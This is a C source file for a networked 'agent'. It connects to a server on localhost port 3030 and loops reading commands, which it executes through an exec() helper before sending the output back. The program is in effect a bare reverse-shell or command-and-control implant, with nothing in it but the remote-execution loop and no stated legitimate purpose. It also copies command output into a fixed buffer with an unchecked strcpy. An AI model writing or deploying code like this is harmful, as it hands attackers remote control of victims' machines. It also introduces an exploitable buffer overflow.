#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "libs/exec.h"
#include "libs/timer.h"

#define PORT 3030 // if necessary; change this

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char hello[4096] = "agent running and up to date";
    char buffer[4096] = {0};

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        exit(1);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        exit(1);
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        exit(1);
    }

    send(sock, hello, strlen(hello), 0);

    while(1){
        memset(buffer, 0, sizeof(buffer));
        memset(hello, 0, sizeof(hello));
        read(sock, buffer, 4096);
        strcpy(hello, exec(buffer)); 
        send(sock, hello, strlen(hello), 0);
    }

    return 0;
}

